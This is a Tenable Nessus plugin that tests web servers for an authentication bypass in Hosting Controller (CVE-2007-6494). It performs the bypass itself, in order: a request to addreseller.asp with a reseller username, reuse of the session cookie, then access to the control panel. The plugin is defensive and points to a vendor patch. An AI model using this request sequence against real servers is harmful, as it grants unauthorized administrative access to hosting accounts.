#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31191);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-6494");
  script_bugtraq_id(26862);
  script_xref(name:"milw0rm", value:"4730");
  script_xref(name:"OSVDB", value:"44186");
  script_xref(name:"Secunia", value:"28973");

  script_name(english:"Hosting Controller hosting/addreseller.asp reseller Variable Authentication Bypass");
  script_summary(english:"Tries to access a user's control panel");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP application that allows a remote
attacker to bypass authentication." );
 script_set_attribute(attribute:"description", value:
"The version of Hosting Controller installed on the remote host allows
a remote attacker to bypass authentication and gain access to an
arbitrary user's control panel, including as an administrator." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-12/0170.html" );
 script_set_attribute(attribute:"see_also", value:"http://hostingcontroller.com/english/logs/Post-Hotfix-3_3-sec-Patch-ReleaseNotes.html" );
 script_set_attribute(attribute:"solution", value:
"Apply the Post Hotfix 3.3 Security Patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8077);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8077);
if (!can_host_asp(port:port)) exit(0);


# Name of a user to authenticate as.
#username = "hcadmin";                  # should work
username = "resadmin";


# Loop through various directories.
if (thorough_tests) dirs = list_uniq("/hc", "/hosting_controller", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  init_cookiejar();
  r = http_send_recv3(method: "GET", 
    item:string(dir, "/hosting/addreseller.asp?reseller=", username),
    port:port
  );
  if (isnull(r)) exit(0);

  if (
    "ActionType=AddUser" >< r[2] &&
    "Set-Cookie: " >< r[1]
  )
  cookies = get_http_cookies_names(name_regex: '^ASPSESSIONID.+');
  if (isnull(cookies) || max_index(cookies) == 0)
    {
        debug_print("couldn't find the cookie!\n");
    }
  else
    {
      postdata = string(
        "TemplateSkin=PanelXP/Blue"
      );
      r = http_send_recv3(
        method:"POST", 
        version: 11,
        item:"/AdminSettings/displays.asp?DecideAction=1&ChangeSkin=1", 
        port:port,
        data:postdata,
        add_headers:make_array("Content-Type", "application/x-www-form-urlencoded")
      );
      if (isnull(r)) exit(0);
      r = http_send_recv3(method: "GET", item:string(dir, "/Contents.asp"), port:port);
      if (isnull(r)) exit(0);

      # There's a problem if we now have access to the user's control panel.
      if ("accounts/dsp_profile.asp" >< r[2])
      {
        security_hole(port);
        exit(0);
      }
    }
}
